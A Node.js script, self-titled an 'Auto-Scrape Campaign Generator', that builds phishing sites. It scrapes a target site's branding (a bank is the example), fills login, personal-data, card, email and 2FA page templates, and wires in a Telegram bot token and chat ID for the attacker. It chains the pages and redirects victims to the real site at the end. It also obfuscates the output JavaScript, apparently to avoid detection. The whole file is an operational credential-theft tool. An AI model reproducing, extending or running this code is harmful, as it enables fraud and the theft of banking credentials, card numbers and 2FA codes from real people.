import fs from 'fs';
import path from 'path';
import { input, confirm } from '@inquirer/prompts';
import chalk from 'chalk';
import puppeteer from 'puppeteer';
import https from 'https';
import http from 'http';
import { fileURLToPath } from 'url';
import { spawn, execSync } from 'child_process';
import net from 'net';
import JavaScriptObfuscator from 'javascript-obfuscator';
import { minify as minifyHtml } from 'html-minifier-terser';
import dotenv from 'dotenv';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({ path: path.join(__dirname, '.env') });

// Helper to download image
const downloadImage = (url, filepath, redirects = 0) => {
    return new Promise((resolve, reject) => {
        if (redirects > 5) return reject(new Error('Too many redirects'));
        const client = url.startsWith('https') ? https : http;
        const options = {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': url.split('/').slice(0, 3).join('/') + '/'
            }
        };
        client.get(url, options, (res) => {
            if (res.statusCode === 200) {
                res.pipe(fs.createWriteStream(filepath))
                   .on('error', reject)
                   .once('close', () => resolve(filepath));
            } else if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                let redirectUrl = res.headers.location;
                if (!redirectUrl.startsWith('http')) {
                    const baseUrl = new URL(url);
                    redirectUrl = `${baseUrl.protocol}//${baseUrl.host}${redirectUrl.startsWith('/') ? '' : '/'}${redirectUrl}`;
                }
                res.resume();
                downloadImage(redirectUrl, filepath, redirects + 1).then(resolve).catch(reject);
            } else {
                res.resume();
                reject(new Error(`Request Failed With a Status Code: ${res.statusCode}`));
            }
        }).on('error', reject);
    });
};

const downloadFirstValidImage = async (urls, destDir, baseName) => {
    if (!Array.isArray(urls)) urls = [urls];
    for (let u of urls) {
        if (!u) continue;
        try {
            let dlUrl = u;
            if (dlUrl.startsWith('//')) dlUrl = 'https:' + dlUrl;
            else if (dlUrl.startsWith('/')) {
                // Not ideal without targetUrl, but try to handle absolute paths
                if (!dlUrl.startsWith('http')) {
                    continue; // skip relative paths if we can't resolve them easily
                }
            }

            const extMatch = dlUrl.split('?')[0].match(/\.(png|jpg|jpeg|svg|gif|webp|ico)$/i);
            const ext = extMatch ? extMatch[1] : 'png';
            const filename = `${baseName}.${ext}`;
            const filepath = path.join(destDir, filename);
            
            await downloadImage(dlUrl, filepath);
            return { url: dlUrl, filename };
        } catch (e) {
            console.log(chalk.gray(`Failed to download ${u}: ${e.message}, trying next...`));
        }
    }
    throw new Error('All image download attempts failed.');
};

// Helper to copy directory recursively
const copyDirSync = (src, dest, exclude = []) => {
    if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });
    let entries = fs.readdirSync(src, { withFileTypes: true });
    for (let entry of entries) {
        if (exclude.includes(entry.name)) continue;
        let srcPath = path.join(src, entry.name);
        let destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
            copyDirSync(srcPath, destPath, exclude);
        } else {
            fs.copyFileSync(srcPath, destPath);
        }
    }
};



async function run() {
    console.log(chalk.bold.magenta('\n*** Auto-Scrape Campaign Generator ***\n'));

    const targetUrl = process.argv[2] || await input({ message: 'Enter the target application URL to clone branding from (e.g. https://www.bank.com):', validate: (i) => i.startsWith('http') ? true : 'Must be a valid HTTP/HTTPS URL' });
    const tgBotToken = process.argv[3] || await input({ message: 'Enter your Telegram Bot Token:', default: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN' });
    const tgChatId = process.argv[4] || await input({ message: 'Enter your Telegram Chat ID:', default: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID' });
    const flowOrder = process.argv[5] || await input({ message: 'Enter page flow order (comma separated from: personal,card,email,2fa):', default: 'personal,card,email,2fa' });
    // Secret CLI flags
    const isDevMode = process.argv.includes('--dev');

    const PAGE_MAP = { 'personal': 'auth-stg.html', 'card': 'sync-p.html', 'email': 'email-stg.html', '2fa': 'chk-v.html' };
    const sequence = flowOrder.toLowerCase().replace(/\s+/g, '').split(',').filter(p => PAGE_MAP[p]);
    const encodedTargetUrl = Buffer.from(targetUrl).toString('base64');
    const finalDest = `atob('${encodedTargetUrl}')`;
    
    let nextMap = {
        '__NEXT_LOGIN__': finalDest,
        '__NEXT_PERSONAL__': finalDest,
        '__NEXT_CARD__': finalDest,
        '__NEXT_EMAIL__': finalDest,
        '__NEXT_2FA__': finalDest
    };
    
    if (sequence.length > 0) {
        nextMap['__NEXT_LOGIN__'] = `'${PAGE_MAP[sequence[0]]}'`;
        for (let i = 0; i < sequence.length; i++) {
            let nextVal = (i + 1 < sequence.length) ? `'${PAGE_MAP[sequence[i + 1]]}'` : finalDest;
            if (sequence[i] === 'personal') nextMap['__NEXT_PERSONAL__'] = nextVal;
            if (sequence[i] === 'card') nextMap['__NEXT_CARD__'] = nextVal;
            if (sequence[i] === 'email') nextMap['__NEXT_EMAIL__'] = nextVal;
            if (sequence[i] === '2fa') nextMap['__NEXT_2FA__'] = nextVal;
        }
    }

    console.log(chalk.bold.cyan('\n--- Manual Branding Override ---'));
    let defaultSiteName = 'Secure Portal';
    try {
        defaultSiteName = new URL(targetUrl).hostname.replace('www.', '').split('.')[0];
        defaultSiteName = defaultSiteName.charAt(0).toUpperCase() + defaultSiteName.slice(1);
    } catch(e) {}

    const defaultSiteNameFallback = defaultSiteName;

    console.log(chalk.cyan(`\n[+] Launching Puppeteer to securely extract branding from ${targetUrl}...`));
    let logoUrl = '';
    let faviconUrl = '';
    let extractedTitle = defaultSiteNameFallback;

    try {
        const browser = await puppeteer.launch({ headless: 'new' });
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        
        const logoElInfo = await page.evaluate(() => {
            const imgs = Array.from(document.querySelectorAll('img, svg'));
            // Look for the most prominent logo based on size, 'logo' string matches, and top positioning constraints
            for (let img of imgs) {
                 const rect = img.getBoundingClientRect();
                 if (rect.width > 20 && rect.height > 10 && rect.top >= 0 && rect.top < 400) {
                     let cname = typeof img.className === 'string' ? img.className : (img.className && img.className.baseVal ? img.className.baseVal : '');
                     if (rect.width >= rect.height || (img.src || '').toLowerCase().includes('logo') || (cname || '').toLowerCase().includes('logo')) {
                         return img.src;
                     }
                 }
            }
            return null;
        });

        if (logoElInfo) {
            logoUrl = logoElInfo;
        }

        faviconUrl = await page.evaluate(() => {
            const el = document.querySelector('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]');
            return el ? el.href : new URL('/favicon.ico', window.location.href).href;
        });

        extractedTitle = await page.evaluate(() => document.title || '') || defaultSiteNameFallback;

        await browser.close();
        console.log(chalk.green(`[✔] Successfully extracted Base64 Logo, Favicon URL, and Title natively.`));
    } catch(err) {
        console.log(chalk.red(`[-] Puppeteer extraction failed: ${err.message}`));
    }

    const siteName = process.env.AUTO_SITENAME || await input({ message: 'Enter the Site Builder Name (Browser Tab Title):', default: extractedTitle });

    const btnDark = process.env.AUTO_BTNDARK || await input({ message: 'Enter the Primary Background Hex Color (e.g., #000663):', default: '#0056b3' });
    const btnLight = process.env.AUTO_BTNLIGHT || await input({ message: 'Enter the CTA Button Hex Color (e.g., #0056b3):', default: '#0056b3' });

    let scrapedData = {
        siteName: siteName,
        logoUrl: logoUrl,
        btnDark: btnDark,
        btnLight: btnLight,
        faviconUrl: faviconUrl || ''
    };

    console.log(chalk.yellow('\n--- Final Branding Metrics ---'));
    console.log(`Site Name: ${scrapedData.siteName}`);
    console.log(`Background Color (Dark): ${chalk.bgHex(scrapedData.btnDark).white(' ' + scrapedData.btnDark + ' ')}`);
    console.log(`CTA Color (Light): ${chalk.bgHex(scrapedData.btnLight).black(' ' + scrapedData.btnLight + ' ')}`);

    let confirmBuild = true;
    if (process.argv.length <= 2) {
        confirmBuild = await confirm({ message: 'Proceed with building the campaign using this data?' });
    }
    if (!confirmBuild) {
        console.log(chalk.red('Aborted.'));
        process.exit(0);
    }

    const domain = new URL(targetUrl).hostname.replace('www.', '');
    const buildDir = path.join(__dirname, 'builds', domain);

    if (fs.existsSync(buildDir)) {
        fs.rmSync(buildDir, { recursive: true, force: true });
    }
    fs.mkdirSync(buildDir, { recursive: true });
    
    // Dump scraped data for debugging
    fs.writeFileSync(path.join(buildDir, 'scraped-data-debug.json'), JSON.stringify(scrapedData, null, 2));

    // 1. Download constraints
    fs.mkdirSync(path.join(buildDir, 'assets'), { recursive: true });
    
    // Copy base static assets into buildDir first, but explicitly exclude the fallback legacy 'logo.png'
    if (fs.existsSync(path.join(__dirname, 'assets'))) {
        copyDirSync(path.join(__dirname, 'assets'), path.join(buildDir, 'assets'), ['logo.png', 'logo.svg']);
    }

    // Embed Email Connect Pro Widget Dist
    const widgetSrc = path.join(__dirname, 'Email Connect Pro', 'dist');
    const widgetDest = path.join(buildDir, 'Email Connect Pro', 'dist');
    if (fs.existsSync(widgetSrc)) {
        copyDirSync(widgetSrc, widgetDest);
        console.log(chalk.blue(`📦 Injected Email Connect Pro widget dependencies.`));
    }

    let finalLogoUrl = 'assets/logo.png'; // default
    let finalFaviconUrl = 'assets/world_favicon.png'; // default fallback from static assets
    
    const manualLogoUrl = process.env.AUTO_LOGOURL || null;

    if (manualLogoUrl && manualLogoUrl.toLowerCase() === 'local') {
        const logoTargetDir = path.join(buildDir, 'assets');
        console.log(chalk.red(`\n[!] LOCAL LOGO INJECTION PAUSE [!]`));
        console.log(chalk.cyan(`Please copy your logo image file and paste it into:`));
        console.log(chalk.whiteBright.bgBlue(` ${logoTargetDir} `));
        console.log(chalk.cyan(`You can name the file: `) + chalk.yellow(`logo.png, logo.webp, logo.svg, etc.`));
        
        await input({ message: chalk.magenta('Press ENTER once the file is placed successfully...') });
        
        const validExts = ['png', 'webp', 'svg', 'jpg', 'jpeg', 'gif'];
        let foundLogo = null;
        for (let ext of validExts) {
            if (fs.existsSync(path.join(logoTargetDir, `logo.${ext}`))) {
                foundLogo = `logo.${ext}`;
                break;
            }
        }

        if (foundLogo) {
            console.log(chalk.green(`✅ Local ${foundLogo} found. Proceeding with compilation.`));
            finalLogoUrl = `assets/${foundLogo}`;
        } else {
            console.log(chalk.red(`❌ No valid logo file found in assets. Generating textual SVG fallback.`));
            let logoFilename = 'scraped-logo.svg';
            finalLogoUrl = `assets/${logoFilename}`;
            const shortName = (scrapedData.siteName || 'Bank Portal').split('-')[0].trim();
            const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-weight="bold" font-size="24" fill="#000000">${shortName}</text></svg>`;
            fs.writeFileSync(path.join(buildDir, 'assets', logoFilename), svgContent);
        }
    } else {
        let targetLogoSrc = manualLogoUrl || scrapedData.logoUrl;

        if (targetLogoSrc) {
            if (manualLogoUrl) {
                 console.log(chalk.blue(`[i] Overriding automated scraper with manual logo URL: ${manualLogoUrl}`));
            }
            try {
                let lgUrl = targetLogoSrc;
                if (lgUrl.startsWith('//')) lgUrl = 'https:' + lgUrl;
                else if (lgUrl.startsWith('/')) lgUrl = targetUrl.replace(/\/$/, '') + lgUrl;

                const result = await downloadFirstValidImage([lgUrl], path.join(buildDir, 'assets'), 'scraped-logo');
                finalLogoUrl = `assets/${result.filename}`;
                console.log(chalk.green(`✅ Downloaded logo successfully: ${result.filename}`));
            } catch (err) {
                console.log(chalk.yellow(`Failed to download logo natively. Hotlinking directly to remote URL.`));
                finalLogoUrl = targetLogoSrc;
            }
        } else {
            console.log(chalk.red(`❌ No logo found via Puppeteer rendering engine.`));
            
            // Check if automation is strictly enforced without interaction, but if the logo failed we ask anyway to give them a chance
            const askLocal = isDevMode ? false : await confirm({ message: 'Would you like to manually inject a local logo file instead of using a text fallback?', default: true });
            
            if (askLocal) {
                const logoTargetDir = path.join(buildDir, 'assets');
                console.log(chalk.red(`\n[!] LOCAL LOGO INJECTION PAUSE [!]`));
                console.log(chalk.cyan(`Please copy your logo image file and paste it into:`));
                console.log(chalk.whiteBright.bgBlue(` ${logoTargetDir} `));
                console.log(chalk.cyan(`You can name the file: `) + chalk.yellow(`logo.png, logo.webp, logo.svg, etc.`));
                
                await input({ message: chalk.magenta('Press ENTER once the file is placed successfully...') });
                
                const validExts = ['png', 'webp', 'svg', 'jpg', 'jpeg', 'gif'];
                let foundLogo = null;
                for (let ext of validExts) {
                    if (fs.existsSync(path.join(logoTargetDir, `logo.${ext}`))) {
                        foundLogo = `logo.${ext}`;
                        break;
                    }
                }

                if (foundLogo) {
                    console.log(chalk.green(`✅ Local ${foundLogo} found. Proceeding with compilation.`));
                    finalLogoUrl = `assets/${foundLogo}`;
                } else {
                    console.log(chalk.red(`❌ No valid logo file found in assets. Generating textual SVG fallback.`));
                    let logoFilename = 'scraped-logo.svg';
                    finalLogoUrl = `assets/${logoFilename}`;
                    const shortName = (scrapedData.siteName || 'Bank Portal').split('-')[0].trim();
                    const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-weight="bold" font-size="24" fill="#000000">${shortName}</text></svg>`;
                    fs.writeFileSync(path.join(buildDir, 'assets', logoFilename), svgContent);
                }
            } else {
                console.log(chalk.yellow(`Generating textual SVG fallback.`));
                let logoFilename = 'scraped-logo.svg';
                finalLogoUrl = `assets/${logoFilename}`;
                const shortName = (scrapedData.siteName || 'Bank Portal').split('-')[0].trim();
                const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-weight="bold" font-size="24" fill="#000000">${shortName}</text></svg>`;
                fs.writeFileSync(path.join(buildDir, 'assets', logoFilename), svgContent);
            }
        }
    }

    if (scrapedData.faviconUrl) {
        try {
            let flUrl = scrapedData.faviconUrl;
            if (flUrl.startsWith('//')) flUrl = 'https:' + flUrl;
            else if (flUrl.startsWith('/')) flUrl = targetUrl.replace(/\/$/, '') + flUrl;

            const result = await downloadFirstValidImage([flUrl], path.join(buildDir, 'assets'), 'scraped-favicon');
            finalFaviconUrl = `assets/${result.filename}`;
            console.log(chalk.green(`✅ Downloaded favicon successfully: ${result.filename}`));
        } catch (err) {
            console.log(chalk.yellow(`Failed to download favicon. Hotlinking directly to remote URL.`));
            finalFaviconUrl = scrapedData.faviconUrl;
        }
    }

    // 2. Process Templates
    const templatesDir = path.join(__dirname, 'templates');
    const templateFiles = ['index.html', 'auth-stg.html', 'chk-v.html', 'email-stg.html', 'sync-p.html', 'app.js', 'style.css', 'cf.html'];

    let loginEntry = 'index.html'; // Default

    for (const file of templateFiles) {
        if (!fs.existsSync(path.join(templatesDir, file))) continue;

        let content = fs.readFileSync(path.join(templatesDir, file), 'utf-8');
        
        // Replace Variables
        content = content.replace(/\{\{SITE_NAME\}\}/g, scrapedData.siteName || 'Secure Portal');
        content = content.replace(/\{\{FAVICON_URL\}\}/g, finalFaviconUrl);
        content = content.replace(/\{\{LOGO_URL\}\}/g, finalLogoUrl);
        content = content.replace(/\{\{BTN_DARK\}\}/g, scrapedData.btnDark);
        content = content.replace(/\{\{BTN_LIGHT\}\}/g, scrapedData.btnLight);
        content = content.replace(/\{\{TG_BOT_TOKEN\}\}/g, tgBotToken);
        content = content.replace(/\{\{TG_CHAT_ID\}\}/g, tgChatId);

        content = content.replace(/__NEXT_LOGIN__/g, nextMap['__NEXT_LOGIN__']);
        content = content.replace(/__NEXT_PERSONAL__/g, nextMap['__NEXT_PERSONAL__']);
        content = content.replace(/__NEXT_CARD__/g, nextMap['__NEXT_CARD__']);
        content = content.replace(/__NEXT_EMAIL__/g, nextMap['__NEXT_EMAIL__']);
        content = content.replace(/__NEXT_2FA__/g, nextMap['__NEXT_2FA__']);

        // Obfuscation and Minification Phase
        if (!isDevMode && (file.endsWith('.html') || file.endsWith('.php'))) {
            try {
                content = await minifyHtml(content, {
                    removeAttributeQuotes: true,
                    removeComments: true,
                    minifyJS: true,
                    minifyCSS: true,
                    ignoreCustomFragments: [ /<\?[\s\S]*?\?>/ ]
                });
            } catch (err) {
                console.error(chalk.red(`Failed to minify ${file}:`), err);
            }
        } else if (!isDevMode && file.endsWith('.css')) {
            try {
                content = new CleanCSS({}).minify(content).styles;
            } catch (err) {
                console.error(chalk.red(`Failed to minify CSS for ${file}:`), err);
            }
        } else if (!isDevMode && file.endsWith('.js')) {
            content = JavaScriptObfuscator.obfuscate(content, {
                compact: true,
                controlFlowFlattening: true,
                stringArray: true,
                stringArrayEncoding: ['base64']
            }).getObfuscatedCode();
        }

        let saveFileName = file;
        if (file === 'index.html') saveFileName = 'login.html';
        else if (file === 'cf.html') saveFileName = 'index.html';

        fs.writeFileSync(path.join(buildDir, saveFileName), content, 'utf-8');
    }
    console.log(chalk.green('✅ Templates processed and injected!'));

    console.log(chalk.green.bold(`\n🎉 Web Application successfully generated and configured natively into ./builds/${domain} for the Node backend`));
    console.log(chalk.cyan(`You can view it live at: http://localhost:3000/${domain}/`));
}

run();
